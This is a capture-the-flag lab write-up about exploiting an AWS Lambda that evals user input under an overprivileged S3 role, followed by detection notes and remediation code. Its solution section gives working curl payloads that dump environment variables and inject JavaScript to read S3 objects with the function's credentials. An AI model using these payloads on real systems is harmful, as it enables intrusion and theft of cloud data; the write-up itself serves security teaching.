# Challenge 05: Insecure Lambda Function (RCE → S3 Exfil)

**Difficulty:** 🔴 Hard  
**Category:** Serverless / Execution  
**MITRE ATT&CK:** [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/) + [T1530 - Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/)

---

## 🎯 Objective

A publicly accessible Lambda "calculator" function uses `eval()` to process user input. The function's IAM role has `s3:*` on all resources. Chain the RCE vulnerability with the overprivileged role to read the flag from S3.

---

## 🌍 Setup

```bash
cd challenges/05-insecure-lambda/terraform
terraform init && terraform apply
# Note the lambda_url and flag_bucket_name
```

---

## 💡 Hints

<details>
<summary>Hint 1</summary>
The Lambda function evaluates JavaScript expressions. `eval()` in Node.js can execute arbitrary code, including requiring built-in modules.
</details>

<details>
<summary>Hint 2</summary>
Inside the Lambda execution environment, you can use `process.env` to read environment variables — including `FLAG_BUCKET`.
</details>

<details>
<summary>Hint 3</summary>
The AWS SDK is available inside Lambda. You can use it within `eval()` to make API calls using the function's IAM role credentials.
</details>

---

## ✅ Solution

### Step 1 — Confirm RCE

```bash
LAMBDA_URL="<your_lambda_url>"

# Test basic eval
curl -X POST $LAMBDA_URL \
  -H "Content-Type: application/json" \
  -d '{"expression": "1+1"}'
# Returns: {"result":"2"}

# Read environment variables
curl -X POST $LAMBDA_URL \
  -H "Content-Type: application/json" \
  -d '{"expression": "JSON.stringify(process.env)"}'
# Returns FLAG_BUCKET name
```

### Step 2 — Use the Lambda's IAM role to read S3

```bash
# Use the AWS SDK available in the Lambda runtime
curl -X POST $LAMBDA_URL \
  -H "Content-Type: application/json" \
  -d '{
    "expression": "
      (async () => {
        const { S3Client, GetObjectCommand } = require(\"@aws-sdk/client-s3\");
        const client = new S3Client({});
        const resp = await client.send(new GetObjectCommand({
          Bucket: process.env.FLAG_BUCKET,
          Key: \"flag.txt\"
        }));
        const chunks = [];
        for await (const chunk of resp.Body) chunks.push(chunk);
        return Buffer.concat(chunks).toString();
      })()
    "
  }'
```

🚩 **Flag:** `CTF{lambda_rce_to_s3_exfil}`

---

## 🔍 MITRE ATT&CK Mapping

| Field | Detail |
|---|---|
| Tactic | Execution, Collection, Exfiltration |
| Technique | T1059 — Command and Scripting Interpreter |
| Technique | T1530 — Data from Cloud Storage Object |
| Detection | CloudWatch Logs: unusual SDK calls in Lambda logs; CloudTrail: `GetObject` from Lambda role |

---

## 🛠️ Remediation

### Fix 1 — Never use eval() on user input

```javascript
// BAD
const result = eval(body.expression);

// GOOD — use a safe expression parser
const { create, all } = require('mathjs');
const math = create(all);
const result = math.evaluate(body.expression); // sandboxed math only
```

### Fix 2 — Add Lambda URL authentication

```hcl
resource "aws_lambda_function_url" "secure" {
  function_name      = aws_lambda_function.secure.function_name
  authorization_type = "AWS_IAM"   # Requires signed requests
}
```

### Fix 3 — Apply least privilege to the Lambda role

```hcl
resource "aws_iam_role_policy" "lambda_policy" {
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect   = "Allow"
        Action   = ["s3:GetObject"]
        Resource = "${aws_s3_bucket.specific_bucket.arn}/specific-prefix/*"
        # NOT s3:* on * — only what the function actually needs
      }
    ]
  })
}
```

### Fix 4 — Enable Lambda code signing

```hcl
resource "aws_lambda_code_signing_config" "signing" {
  allowed_publishers {
    signing_profile_version_arns = [aws_signer_signing_profile.profile.arn]
  }
  policies {
    untrusted_artifact_on_deployment = "Enforce"
  }
}
```

---

## 📚 Further Reading

- [AWS Lambda Security Best Practices](https://docs.aws.amazon.com/lambda/latest/dg/security-resilience.html)
- [Lambda Function URLs Auth](https://docs.aws.amazon.com/lambda/latest/dg/urls-auth.html)
- [MITRE T1059](https://attack.mitre.org/techniques/T1059/)
